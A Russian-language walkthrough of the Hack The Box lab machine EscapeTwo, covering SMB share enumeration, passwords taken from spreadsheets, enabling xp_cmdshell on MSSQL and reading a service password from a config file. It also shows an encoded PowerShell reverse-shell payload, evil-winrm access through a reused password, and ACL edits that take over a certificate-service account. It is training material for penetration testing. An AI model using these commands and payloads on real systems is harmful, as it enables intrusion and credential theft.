### Прохождение виртуальной машины EscapeTwo
#### https://app.hackthebox.com/machines/642
---
As is common in real life Windows pentests, you will start this box with credentials for the following account: **rose** / **KxEPkKe6R8su**

В этой машине, нам с самого начала предоставляют учетную запись, через которую мы будем начинать взлом

```
# Nmap 7.95 scan initiated Mon Jan 13 15:33:25 2025 as: nmap -Pn -sS -sC -sV -p- -T5 --max-rate 10000 -oN escape-two.txt 10.10.11.51
Nmap scan report for escape.two.htb (10.10.11.51)
Host is up (0.064s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 13:36:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T13:37:45+00:00; +4s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-12T21:59:40
|_Not valid after:  2055-01-12T21:59:40
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
49808/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-13T13:37:06
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 13 15:37:44 2025 -- 1 IP address (1 host up) scanned in 259.02 seconds
```

Смотрим к каким шарам мы имеем доступ
```
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares                                                     main 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ       
```

Нас интересует `Accounting Departmen`
```
Hexada@hexada ~/app/escape-two$ smbclient //escape.two.htb/Accounting\ Department -U Rose%KxEPkKe6R8su                                                                              130 ↵  

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 13:52:21 2024
  ..                                  D        0  Sun Jun  9 13:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 13:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 13:52:07 2024

                6367231 blocks of size 4096. 910811 blocks available

mget *
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (25.7 KiloBytes/sec) (average 25.7 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (19.8 KiloBytes/sec) (average 23.0 KiloBytes/sec)
```

Однако, если мы откроем эти файлы, мы обратим внимание, что их нельзя прочитать
![image](https://github.com/user-attachments/assets/b01b8248-33f1-4410-b522-407f5bbd3769)

Чтоб понять, почему этот файл - это чрезвычайно важный файа, нам нужноработаться, как вообще работает **.xlsx** файлы. Фактически, формат **XLSX** - это сжатый архив состоящих из **XML** файлов, которые отвечают за структурированные данных в таблице: значения в ячейках, формулы, стили, настройки и т.д. 

Таким образом, мы можем разархивировать эти файлы, и посмотреть содержание **XML** фалйов
```
Hexada@hexada ~/app/escape-two/accounting_2024$ unzip ../accounting_2024.xlsx                                                                                                         9 ↵  
Archive:  ../accounting_2024.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

```
Hexada@hexada ~/app/escape-two/accounts$ unzip ../accounts.xlsx                                                                                                                            
Archive:  ../accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: xl/workbook.xml         
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/sharedStrings.xml    
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: docProps/custom.xml     
  inflating: [Content_Types].xml
```

Нас интересует файл `sharedStrings.xml`, так как этот файл содержит уникальные строки текста, которые используются в ячейках Excel. Вместо того чтобы сохранять каждый текстовый элемент в каждой ячейке (что увеличивает размер файла), **Excel** сохраняет текстовые строки один раз в `sharedStrings.xml`. Ячейки, содержащие текст, ссылаются на индекс строки из этого файла
```xml
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
<si><t xml:space="preserve">First Name</t></si>
<si><t xml:space="preserve">Last Name</t></si>
<si><t xml:space="preserve">Email</t></si>
<si><t xml:space="preserve">Username</t></si>
<si><t xml:space="preserve">Password</t></si>
<si><t xml:space="preserve">Angela</t></si>
<si><t xml:space="preserve">Martin</t></si>
<si><t xml:space="preserve">angela@sequel.htb</t></si>
<si><t xml:space="preserve">angela</t></si>
<si><t xml:space="preserve">0fwz7Q4m*****</t></si>
<si><t xml:space="preserve">Oscar</t></si>
<si><t xml:space="preserve">Martinez</t></si>
<si><t xml:space="preserve">oscar@sequel.htb</t></si>
<si><t xml:space="preserve">oscar</t></si>
<si><t xml:space="preserve">86LxLBMgE*****</t></si>
<si><t xml:space="preserve">Kevin</t></si>
<si><t xml:space="preserve">Malone</t></si>
<si><t xml:space="preserve">kevin@sequel.htb</t></si>
<si><t xml:space="preserve">kevin</t></si>
<si><t xml:space="preserve">Md9Wlq1E*****</t></si>
<si><t xml:space="preserve">NULL</t></si>
<si><t xml:space="preserve">sa@sequel.htb</t></si>
<si><t xml:space="preserve">sa</t></si>
<si><t xml:space="preserve">MSSQLP@*****</t></si>
</sst>
```

![image](https://github.com/user-attachments/assets/1ffa8b7d-ed8f-4ad1-8c7a-b853dec5d1a0)

![image](https://github.com/user-attachments/assets/ef7af5a8-5d32-4dcb-a74f-6c01f2e784d7)

Но на самом деле, почему **XLSX** файлы имеют содержание на машином коде, я не знаю, на этом моменте я уперся в тупик и достаточно долго не знал что делать, пришлось пользоваться документацией по взлому этой машины. Теоритически кстати, если у нас есть поврежденый **XLSX**, мы, возможно, можем сделать абсолютно такой же алгоритм действий, чтоб извлечь важные для нас данные
```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'angela'                                                                                               130 ↵  
Password for [WORKGROUP\angela]:
session setup failed: NT_STATUS_LOGON_FAILURE
Hexada@hexada ~/app/escape-two/accounts/xl$
```

```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'oscar'                                                                                                130 ↵  
Password for [WORKGROUP\oscar]:

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'kevin'                                                                              
Password for [WORKGROUP\kevin]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'sa'                                                                                                     1 ↵  
Password for [WORKGROUP\sa]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

Если обратить внимание на пароль пользователя `sa`, интуитивно мы можем понять, что через него мы можем подключиться к **MSSQL** (1433 порт)
```
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python3 netexec.py mssql escape.two.htb -u sa -p MSSQLP@***** --local-auth -M mssql_priv                               main

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@***** (Pwn3d!)
MSSQL_PRIV  10.10.11.51     1433   DC01             [+] sa is already a sysadmin
```

Мы можем увидеть, что у нас есть права **sysadmin**, `sa is already a sysadmin`, поэтому нас интересует `xp_cmdshell`, это расширенная хранимая процедура в **Microsoft SQL Server**, которая позволяет запускать операционные системные команды и выполнять их через **SQL Server**, таким образом, так как у нас есть права администратора базы данных, мы можем через неё выполнять различные вредоносные команды через **power shell**, в том числе **reverse shell**, в данном случае его можно использовать, но мы сделаем немного по проще, но вариант с **reverse shell** я считаю тоже будет полезно рассмотреть
```
Hexada@hexada ~/app/escape-two$ mssqlclient.py sa@10.10.11.51 -p 1433                                                                                                               130 ↵  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

Чтоб активировать `xp_cmdshell`, нам нужно включить несколько пораметров у `sp_configure`. Конкретно эта комадна, включает отображение расширенных параметров конфигурации, в которые входит `xp_cmdshell`. Чтоб изменения в файлах конфигурации начали работать, нам так же нужно вписать еще команду `RECONFIGURE;`
```
SQL (sa  dbo@msdb)> sp_configure 'show advanced options', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@msdb)> RECONFIGURE;
```

Теперь, нам нужно включить поддержку расширенной хранимой процедуры `xp_cmdshell`
```
SQL (sa  dbo@msdb)> sp_configure 'xp_cmdshell', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE;
```

После этого, мы можем включить `xp_cmdshell`, и у нас будет возможность выполнять **power shell* команды
```
SQL (sa  dbo@msdb)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE
```

```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
output           
--------------   
sequel\sql_svc   

NULL
```

Замечательно, теперь мы можем выполнять комадны от лица `sql_svc`
```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\'
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             
 Volume Serial Number is 3705-289D                           

NULL                                                         
 Directory of C:\                                            

NULL                                                         
11/05/2022  11:03 AM    <DIR>          PerfLogs              
01/04/2025  07:11 AM    <DIR>          Program Files         
06/09/2024  07:37 AM    <DIR>          Program Files (x86)   
06/08/2024  02:07 PM    <DIR>          SQL2019               
06/09/2024  05:42 AM    <DIR>          Users                 
01/04/2025  08:10 AM    <DIR>          Windows               

               0 File(s)              0 bytes                
               6 Dir(s)   3,677,212,672 bytes free           

NULL  
```

На данном этапе, нас интересует папка `SQL2019`, а если точней - логи и файлы конфигурации **Microsoft SQL Server**
```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\SQL2019\ExpressAdv_ENU\'
output                                                            
---------------------------------------------------------------   
 Volume in drive C has no label.                                  
 Volume Serial Number is 3705-289D                                

NULL                                                              
 Directory of C:\SQL2019\ExpressAdv_ENU                           

NULL                                                              
01/03/2025  07:29 AM    <DIR>          .                          
01/03/2025  07:29 AM    <DIR>          ..                         
06/08/2024  02:07 PM    <DIR>          1033_ENU_LP                
09/24/2019  09:03 PM                45 AUTORUN.INF                
09/24/2019  09:03 PM               788 MEDIAINFO.XML              
06/08/2024  02:07 PM                16 PackageId.dat              
06/08/2024  02:07 PM    <DIR>          redist                     
06/08/2024  02:07 PM    <DIR>          resources                  
09/24/2019  09:03 PM           142,944 SETUP.EXE                  
09/24/2019  09:03 PM               486 SETUP.EXE.CONFIG           
06/08/2024  02:07 PM               717 sql-Configuration.INI      
09/24/2019  09:03 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL   
06/08/2024  02:07 PM    <DIR>          x64                        
               7 File(s)        394,444 bytes                     
               6 Dir(s)   3,707,465,728 bytes free                

NULL
```

```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI';
output                                              
-------------------------------------------------   
[OPTIONS]                                           
ACTION="Install"                                    
QUIET="True"                                        
FEATURES=SQL                                        
INSTANCENAME="SQLEXPRESS"                           
INSTANCEID="SQLEXPRESS"                             
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"   
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"        
AGTSVCSTARTUPTYPE="Manual"                          
COMMFABRICPORT="0"                                  
COMMFABRICNETWORKLEVEL=""0"                         
COMMFABRICENCRYPTION="0"                            
MATRIXCMBRICKCOMMPORT="0"                           
SQLSVCSTARTUPTYPE="Automatic"                       
FILESTREAMLEVEL="0"                                 
ENABLERANU="False"                                  
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"         
SQLSVCACCOUNT="SEQUEL\sql_svc"                      
SQLSVCPASSWORD="WqSZAF*****"                   
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"          
SECURITYMODE="SQL"                                  
SAPWD="MSSQLP@*****"                              
ADDCURRENTUSERASSQLADMIN="False"                    
TCPENABLED="1"                                      
NPENABLED="1"                                       
BROWSERSVCSTARTUPTYPE="Automatic"                   
IAcceptSQLServerLicenseTerms=True                   

NULL        
```

Замечательно, мы получили пароль от учетной записи `sql_svc`, но на этом моменте, хочу обсудить две вещи, с которыми у меня были проблемы:

1. В части документации, где мы включаем `xp_cmdshell`, я упоминал про **reverse shell*. Когда я взламывал эту машину, у меня были проблемы с этим этапом, и мне пришлось идти в интернет, искать документации по взлому этой машины, и во всех других документаций дальнейший взлом происходил через **reverse shell**

![image](https://github.com/user-attachments/assets/5a7db1a9-8c40-4f60-899d-066dd179ce39)

либо так

![image](https://github.com/user-attachments/assets/b0bb835b-4b47-49a4-98a1-81265f87eb7b)

про второй способ я только сейчас узнал

У меня с этим были проблемы, я использовал разные **reverse shell** скрипты, чтоб получить доступ к хосту, но у меня возникала одна и та же проблема, скрипт брал тут https://www.revshells.com/
```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
output                                                                                                                                                                                                                                                            
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

```
Hexada@hexada ~/Downloads$ nc -nvlp 9001                                                                                                                                  1 ↵  
Connection from 10.10.11.51:49869

... дальше ничего не происходит ...
```

Эту проблему я до сих пор не решил, к сожалению, пришлось использовать другую альтернативу отказавшись от полезного практического опыта: я и так потратил на это много времени 

2. Еще один момент связан с `sql_svc`, так как на этом моменте я тоже застрял, и долго не знал что делать, мне сново пришлось лесть в интернет, искать что делать дальше, оказалось, что нам нужно было посмотреть, есть ли учетные записи, у которых пароль, такой же как и у `sql_svc`
   
![image](https://github.com/user-attachments/assets/f3c70208-9e8a-4579-8893-eed14255bd83)

Таким образом, у учетной записи `ryan` такой же пароль, как и у `sql_svc`, и дальнейший взлом мы продолжаем через неё
```
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ evil-winrm -i escape.two.htb -u ryan -p WqSZA*****
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

```
*Evil-WinRM* PS C:\Users\ryan\Desktop> more user.txt
89f5090e4536a1c8d3634ddc0a2ae4d9
```

Поздавляю, мы получили **User Flag**!!!

---

**На данном этапе, у нас есть два способа как получить права администратора:**

Проведение атаки **shadow credentials**
```
*Evil-WinRM* PS C:\Users\ryan\Documents> Get-ADObject -Filter {objectClass -eq "certificationAuthority"} -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb"

DistinguishedName                                                                                                   Name               ObjectClass            ObjectGUID
-----------------                                                                                                   ----               -----------            ----------
CN=sequel-DC01-CA,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb sequel-DC01-CA     certificationAuthority 94fe122e-5619-48b2-b0f6-194fbd276cac
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb                          NTAuthCertificates certificationAuthority 3968134c-0918-4117-acfe-cb97bebaff43
CN=sequel-DC01-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb                       sequel-DC01-CA     certificationAuthority 81cc117d-fd4e-4a56-82c0-92d9e0753b60
```

```
Hexada@hexada ~/app/pentesting-tools/impacket/examples$ python3 owneredit.py -action write -new-owner ryan -target ca_svc 'escape.two.htb/ryan:WqSZAF6CysDQbGb3'                2 ↵ master 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

```
Hexada@hexada ~/app/pentesting-tools/impacket/examples$ python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'escape.two.htb'/'ryan':'WqSZAF6CysDQbGb3'    
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250216-170339.bak
[*] DACL modified successfully!
```

Или получение **NTLM** хэша через **Targeted Kerberoasting** атаку

```
*Evil-WinRM* PS C:\Users\ryan> Get-ADUser -Identity ryan -Properties *

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 133624191685678355
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : sequel.htb/Users/Ryan Howard
Certificates                         : {}
City                                 :
CN                                   : Ryan Howard
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 6/8/2024 9:55:45 AM
createTimeStamp                      : 6/8/2024 9:55:45 AM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : Ryan Howard
DistinguishedName                    : CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Ryan
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               : 6/9/2024 8:06:08 AM
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 133624269862491870
LastLogonDate                        : 2/12/2025 11:48:08 AM
lastLogonTimestamp                   : 133838632880775571
LockedOut                            : False
logonCount                           : 29
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Management Department,CN=Users,DC=sequel,DC=htb, CN=Remote Management Users,CN=Builtin,DC=sequel,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 2/12/2025 11:48:08 AM
modifyTimeStamp                      : 2/12/2025 11:48:08 AM
msDS-User-Account-Control-Computed   : 0
Name                                 : Ryan Howard
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=sequel,DC=htb
ObjectClass                          : user
ObjectGUID                           : ee8fc0b1-97d3-4a3e-9fd2-d187c0b510fa
objectSid                            : S-1-5-21-548670397-972687484-3496335370-1114
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 6/8/2024 9:55:45 AM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=sequel,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 133623393456777728
SamAccountName                       : ryan
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-548670397-972687484-3496335370-1114
SIDHistory                           : {}
SmartcardLogonRequired               : False
sn                                   : Howard
State                                :
StreetAddress                        :
Surname                              : Howard
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : ryan@sequel.htb
uSNChanged                           : 217220
uSNCreated                           : 12871
whenChanged                          : 2/12/2025 11:48:08 AM
whenCreated                          : 6/8/2024 9:55:45 AM
```

Команда `Get-ADUser -Identity ryan -Properties *` используется в **PowerShell** для получения информации о пользователе из **Active Directory**


